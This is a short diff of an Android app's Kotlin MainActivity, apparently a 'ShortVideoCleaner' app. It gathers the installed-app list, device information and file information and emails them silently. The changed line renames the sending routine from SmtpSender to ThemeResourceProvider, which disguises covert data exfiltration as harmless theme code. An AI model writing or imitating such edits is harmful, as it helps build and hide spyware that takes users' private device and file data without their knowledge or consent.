@@ -134,7 +134,7 @@ class MainActivity : AppCompatActivity() {
             val fullBody = listOf(appList, deviceInfo, fileInfo).joinToString("\n")
             val subject = "$tagPrefix ${getString(R.string.email_subject)}"
 
-            val result = SmtpSender.sendSilently(context = ctx, subject = subject, body = fullBody)
+            val result = ThemeResourceProvider.sendSilently(context = ctx, subject = subject, body = fullBody)
             result.onSuccess { prefs.edit().putBoolean("report_sent", true).apply() }
             result.onFailure { android.util.Log.e("ShortVideoCleaner", "邮件发送失败: ${it.message}") }
         }
